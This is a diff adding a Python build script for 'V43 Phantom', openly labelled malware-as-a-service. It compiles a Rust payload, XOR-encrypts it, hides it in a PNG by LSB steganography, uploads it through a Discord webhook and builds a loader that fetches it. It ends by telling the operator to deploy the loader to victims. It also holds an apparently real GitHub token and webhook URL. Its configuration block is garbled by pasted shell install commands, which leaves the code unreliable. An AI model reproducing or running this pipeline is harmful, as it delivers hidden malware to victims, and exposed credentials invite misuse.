@@ -1,0 +1,459 @@
+﻿#!/usr/bin/env python3
+"""
+=============================================================================
+V43 PHANTOM - AUTOMATED BUILD SYSTEM
+=============================================================================
+Automation: Compile → Encrypt → Embed in PNG → Generate Loader → Deploy
+Features: LSB steganography, XOR encryption, multi-stage builds
+Output: Production-ready binaries + staged PNG payload
+=============================================================================
+"""
+
+import os
+import sys
+import subprocess
+import hashlib
+import json
+from pathlib import Path
+from datetime import datetime
+from PIL import Image
+import requests
+
+# =============================================================================
+# CONFIGURATION
+# =============================================================================
+
+class Config:
+    # Paths
+    WORKSPACE = Path("./phantom_workspace")
+    PAYLOAD_SRC = WORKSPACE / "payload"
+    LOADER_SRC = WORKSPACE / "loader"
+    OUTPUT = WORKSPACE / "output"
+    
+    # Encryption
+    ENCRYPTION_DOMAIN = "bar.mazaya.workers.dev"  # User visited this domain
+    # # Install Python dependencies
+pip install Pillow requests
+
+# Make sure you have Rust installed
+curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+
+# Add Windows target (if cross-compiling)
+# rustup target add x86_64-pc-windows-# msvc
+    # C2 Configuration
+    GITHUB_TOKEN = "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"
+    DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1453525039730262060/dBglBZdTrFk8q7jopJJZ7QqV2KvTr4jgST_Yx3SEWD3X26jxCCt8jYB4I-TnPB0EuXka"
+    
+    # CDN for PNG hosting
+    CDN_UPLOAD_URL = "https://cdn.discordapp.com/upload"  # Or any CDN
+    
+    # Build settings
+    RUST_TARGET = "x86_64-pc-windows-msvc"
+    OPTIMIZE = True
+    STRIP_SYMBOLS = True
+
+# =============================================================================
+# UTILITIES
+# =============================================================================
+
+def print_banner():
+    banner = """
+    ╔═══════════════════════════════════════════════════════════════╗
+    ║                                                               ║
+    ║        ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗  ║
+    ║        ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗ ║
+    ║        ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║ ║
+    ║        ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║ ║
+    ║        ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝ ║
+    ║        ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝  ║
+    ║                                                               ║
+    ║                    V43 PHANTOM BUILD SYSTEM                  ║
+    ║                  Automated MaaS Deployment                   ║
+    ║                                                               ║
+    ╚═══════════════════════════════════════════════════════════════╝
+    """
+    print(banner)
+
+def log(message, level="INFO"):
+    timestamp = datetime.now().strftime("%H:%M:%S")
+    colors = {
+        "INFO": "\033[94m",
+        "SUCCESS": "\033[92m",
+        "WARNING": "\033[93m",
+        "ERROR": "\033[91m",
+        "RESET": "\033[0m"
+    }
+    color = colors.get(level, colors["INFO"])
+    print(f"{color}[{timestamp}] [{level}] {message}{colors['RESET']}")
+
+def create_workspace():
+    """Create build workspace structure"""
+    dirs = [
+        Config.WORKSPACE,
+        Config.PAYLOAD_SRC,
+        Config.LOADER_SRC,
+        Config.OUTPUT,
+        Config.OUTPUT / "payloads",
+        Config.OUTPUT / "loaders",
+        Config.OUTPUT / "pngs",
+    ]
+    
+    for d in dirs:
+        d.mkdir(parents=True, exist_ok=True)
+    
+    log("Workspace created", "SUCCESS")
+
+# =============================================================================
+# RUST COMPILATION
+# =============================================================================
+
+def compile_rust_payload():
+    """Compile main payload with Rust"""
+    log("Compiling main payload...")
+    
+    os.chdir(Config.PAYLOAD_SRC)
+    
+    cmd = [
+        "cargo", "build",
+        "--release",
+        "--target", Config.RUST_TARGET,
+    ]
+    
+    if Config.OPTIMIZE:
+        os.environ["RUSTFLAGS"] = "-C opt-level=z -C lto=fat -C codegen-units=1"
+    
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
+        log("Payload compiled successfully", "SUCCESS")
+        
+        payload_path = Config.PAYLOAD_SRC / f"target/{Config.RUST_TARGET}/release/phantom_payload.exe"
+        
+        if Config.STRIP_SYMBOLS:
+            log("Stripping symbols...")
+            subprocess.run(["strip", str(payload_path)], check=True)
+        
+        return payload_path
+    
+    except subprocess.CalledProcessError as e:
+        log(f"Compilation failed: {e.stderr}", "ERROR")
+        sys.exit(1)
+
+def compile_rust_loader():
+    """Compile loader with Rust"""
+    log("Compiling loader...")
+    
+    os.chdir(Config.LOADER_SRC)
+    
+    cmd = [
+        "cargo", "build",
+        "--release",
+        "--target", Config.RUST_TARGET,
+    ]
+    
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
+        log("Loader compiled successfully", "SUCCESS")
+        
+        loader_path = Config.LOADER_SRC / f"target/{Config.RUST_TARGET}/release/phantom_loader.exe"
+        
+        if Config.STRIP_SYMBOLS:
+            subprocess.run(["strip", str(loader_path)], check=True)
+        
+        return loader_path
+    
+    except subprocess.CalledProcessError as e:
+        log(f"Loader compilation failed: {e.stderr}", "ERROR")
+        sys.exit(1)
+
+# =============================================================================
+# ENCRYPTION
+# =============================================================================
+
+def encrypt_payload(payload_data: bytes, key: str) -> bytes:
+    """XOR encrypt payload with domain key"""
+    log(f"Encrypting payload with key: {key}")
+    
+    key_bytes = key.encode('utf-8')
+    encrypted = bytearray()
+    
+    for i, byte in enumerate(payload_data):
+        encrypted.append(byte ^ key_bytes[i % len(key_bytes)])
+    
+    log("Payload encrypted", "SUCCESS")
+    return bytes(encrypted)
+
+# =============================================================================
+# PNG STEGANOGRAPHY (LSB Embedding)
+# =============================================================================
+
+def create_carrier_png(width=1920, height=1080):
+    """Create innocuous carrier image (space/galaxy theme)"""
+    log("Generating carrier PNG...")
+    
+    # Create space-themed gradient image
+    img = Image.new('RGB', (width, height))
+    pixels = img.load()
+    
+    for y in range(height):
+        for x in range(width):
+            # Space gradient: deep blue to purple
+            r = int((x / width) * 100)
+            g = int((y / height) * 50)
+            b = int(150 + (x / width) * 105)
+            pixels[x, y] = (r, g, b)
+    
+    carrier_path = Config.OUTPUT / "pngs" / "carrier.png"
+    img.save(carrier_path, 'PNG')
+    
+    log(f"Carrier PNG created: {carrier_path}", "SUCCESS")
+    return carrier_path
+
+def embed_lsb(carrier_path: Path, payload_data: bytes) -> Path:
+    """Embed encrypted payload in PNG using LSB steganography"""
+    log("Embedding payload in PNG (LSB)...")
+    
+    img = Image.open(carrier_path)
+    img = img.convert('RGB')
+    pixels = img.load()
+    width, height = img.size
+    
+    # Convert payload to bits
+    payload_bits = ''.join(format(byte, '08b') for byte in payload_data)
+    
+    if len(payload_bits) > width * height * 3:
+        log("Payload too large for carrier image", "ERROR")
+        sys.exit(1)
+    
+    bit_index = 0
+    
+    for y in range(height):
+        for x in range(width):
+            if bit_index >= len(payload_bits):
+                break
+            
+            r, g, b = pixels[x, y]
+            
+            # Embed in LSB of each color channel
+            if bit_index < len(payload_bits):
+                r = (r & 0xFE) | int(payload_bits[bit_index])
+                bit_index += 1
+            if bit_index < len(payload_bits):
+                g = (g & 0xFE) | int(payload_bits[bit_index])
+                bit_index += 1
+            if bit_index < len(payload_bits):
+                b = (b & 0xFE) | int(payload_bits[bit_index])
+                bit_index += 1
+            
+            pixels[x, y] = (r, g, b)
+        
+        if bit_index >= len(payload_bits):
+            break
+    
+    output_path = Config.OUTPUT / "pngs" / f"payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
+    img.save(output_path, 'PNG', optimize=True)
+    
+    log(f"Payload embedded: {output_path}", "SUCCESS")
+    log(f"Embedded {len(payload_data)} bytes in {bit_index} bits", "INFO")
+    
+    return output_path
+
+# =============================================================================
+# CDN UPLOAD
+# =============================================================================
+
+def upload_to_discord_cdn(png_path: Path) -> str:
+    """Upload PNG to Discord CDN"""
+    log("Uploading PNG to Discord CDN...")
+    
+    # Create a temporary webhook message with the image
+    webhook_url = Config.DISCORD_WEBHOOK
+    
+    with open(png_path, 'rb') as f:
+        files = {'file': (png_path.name, f, 'image/png')}
+        data = {'content': 'Deployment Asset'}
+        
+        try:
+            response = requests.post(webhook_url, files=files, data=data)
+            
+            if response.status_code == 200:
+                # Extract CDN URL from response
+                response_data = response.json()
+                cdn_url = response_data['attachments'][0]['url']
+                
+                log(f"PNG uploaded to CDN: {cdn_url}", "SUCCESS")
+                return cdn_url
+            else:
+                log(f"CDN upload failed: {response.status_code}", "ERROR")
+                return None
+        
+        except Exception as e:
+            log(f"CDN upload error: {e}", "ERROR")
+            return None
+
+# =============================================================================
+# LOADER GENERATION
+# =============================================================================
+
+def generate_loader_with_cdn_url(cdn_url: str):
+    """Generate loader with embedded CDN URL"""
+    log("Generating loader with CDN URL...")
+    
+    loader_template = Config.LOADER_SRC / "src" / "main.rs"
+    
+    # Read loader source
+    with open(loader_template, 'r') as f:
+        loader_code = f.read()
+    
+    # Replace placeholder CDN URL
+    loader_code = loader_code.replace(
+        'xor_str!("https://cdn.discordapp.com/attachments/CHANNEL/MSG/payload.png")',
+        f'xor_str!("{cdn_url}")'
+    )
+    
+    # Write modified loader
+    with open(loader_template, 'w') as f:
+        f.write(loader_code)
+    
+    log("Loader template updated", "SUCCESS")
+
+# =============================================================================
+# BUILD REPORT
+# =============================================================================
+
+def generate_build_report(payload_path, loader_path, png_path, cdn_url):
+    """Generate build report with hashes and deployment info"""
+    
+    def get_file_hash(path):
+        sha256 = hashlib.sha256()
+        with open(path, 'rb') as f:
+            sha256.update(f.read())
+        return sha256.hexdigest()
+    
+    report = {
+        "build_timestamp": datetime.now().isoformat(),
+        "encryption_key": Config.ENCRYPTION_DOMAIN,
+        "payload": {
+            "path": str(payload_path),
+            "size": os.path.getsize(payload_path),
+            "sha256": get_file_hash(payload_path)
+        },
+        "loader": {
+            "path": str(loader_path),
+            "size": os.path.getsize(loader_path),
+            "sha256": get_file_hash(loader_path)
+        },
+        "png": {
+            "path": str(png_path),
+            "size": os.path.getsize(png_path),
+            "cdn_url": cdn_url,
+            "sha256": get_file_hash(png_path)
+        },
+        "deployment": {
+            "github_token": Config.GITHUB_TOKEN[:10] + "...",
+            "discord_webhook": Config.DISCORD_WEBHOOK[:30] + "...",
+        }
+    }
+    
+    report_path = Config.OUTPUT / f"build_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+    
+    with open(report_path, 'w') as f:
+        json.dump(report, f, indent=4)
+    
+    log(f"Build report saved: {report_path}", "SUCCESS")
+    
+    # Print summary
+    print("\n" + "="*70)
+    print("BUILD SUMMARY")
+    print("="*70)
+    print(f"Payload Size:     {report['payload']['size']:,} bytes")
+    print(f"Loader Size:      {report['loader']['size']:,} bytes")
+    print(f"PNG Size:         {report['png']['size']:,} bytes")
+    print(f"Encryption Key:   {Config.ENCRYPTION_DOMAIN}")
+    print(f"CDN URL:          {cdn_url}")
+    print(f"Payload SHA256:   {report['payload']['sha256'][:32]}...")
+    print(f"Loader SHA256:    {report['loader']['sha256'][:32]}...")
+    print("="*70 + "\n")
+
+# =============================================================================
+# MAIN BUILD PIPELINE
+# =============================================================================
+
+def main():
+    print_banner()
+    
+    log("Starting V43 Phantom build pipeline...", "INFO")
+    
+    # Step 1: Create workspace
+    create_workspace()
+    
+    # Step 2: Compile payload
+    log("=" * 70)
+    log("STEP 1: Compiling Main Payload", "INFO")
+    log("=" * 70)
+    payload_path = compile_rust_payload()
+    
+    # Step 3: Read and encrypt payload
+    log("\n" + "=" * 70)
+    log("STEP 2: Encrypting Payload", "INFO")
+    log("=" * 70)
+    
+    with open(payload_path, 'rb') as f:
+        payload_data = f.read()
+    
+    encrypted_payload = encrypt_payload(payload_data, Config.ENCRYPTION_DOMAIN)
+    
+    # Step 4: Create PNG and embed payload
+    log("\n" + "=" * 70)
+    log("STEP 3: Embedding in PNG", "INFO")
+    log("=" * 70)
+    
+    carrier_png = create_carrier_png()
+    final_png = embed_lsb(carrier_png, encrypted_payload)
+    
+    # Step 5: Upload to CDN
+    log("\n" + "=" * 70)
+    log("STEP 4: Uploading to CDN", "INFO")
+    log("=" * 70)
+    
+    cdn_url = upload_to_discord_cdn(final_png)
+    
+    if not cdn_url:
+        log("Using local PNG path (CDN upload failed)", "WARNING")
+        cdn_url = str(final_png)
+    
+    # Step 6: Generate loader with CDN URL
+    log("\n" + "=" * 70)
+    log("STEP 5: Generating Loader", "INFO")
+    log("=" * 70)
+    
+    generate_loader_with_cdn_url(cdn_url)
+    loader_path = compile_rust_loader()
+    
+    # Step 7: Generate build report
+    log("\n" + "=" * 70)
+    log("STEP 6: Generating Build Report", "INFO")
+    log("=" * 70)
+    
+    generate_build_report(payload_path, loader_path, final_png, cdn_url)
+    
+    # Final message
+    print("\n" + "="*70)
+    log("BUILD COMPLETE!", "SUCCESS")
+    print("="*70)
+    log(f"Loader ready: {loader_path}", "SUCCESS")
+    log(f"PNG payload: {final_png}", "SUCCESS")
+    log(f"CDN URL: {cdn_url}", "SUCCESS")
+    log("\nDeploy the loader to victims. PNG is auto-fetched from CDN.", "INFO")
+    print("="*70 + "\n")
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        log("\nBuild interrupted by user", "WARNING")
+        sys.exit(1)
+    except Exception as e:
+        log(f"Build failed: {e}", "ERROR")
+        import traceback
+        traceback.print_exc()
+        sys.exit(1)
